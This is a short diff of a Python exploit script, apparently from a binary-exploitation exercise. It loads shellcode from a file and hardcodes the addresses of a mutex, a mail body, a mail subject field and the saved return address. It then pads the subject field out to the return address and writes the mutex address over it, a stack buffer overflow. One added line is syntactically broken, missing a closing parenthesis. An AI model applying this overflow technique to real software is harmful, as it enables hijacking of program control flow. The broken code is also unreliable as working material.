@@ -32,6 +32,14 @@ with open("shell.bin", "rb") as f:
 # Here we have the address of the mutex struct.
 pmutex = int(sys.stdin.readline(), 16)
 
-writeStr("Header\n")
+mutex = 0x5555555580c0
+mail_body = 0x555555558040
 
-writeStr("Body\n")
+mail_subject = 0x7fffffffdde0
+ripat = 0x7fffffffde08
+
+
+writeStr("."*(ripat - mail_subject)
+
+writeBytes(mutex)
+writeStr("\n")
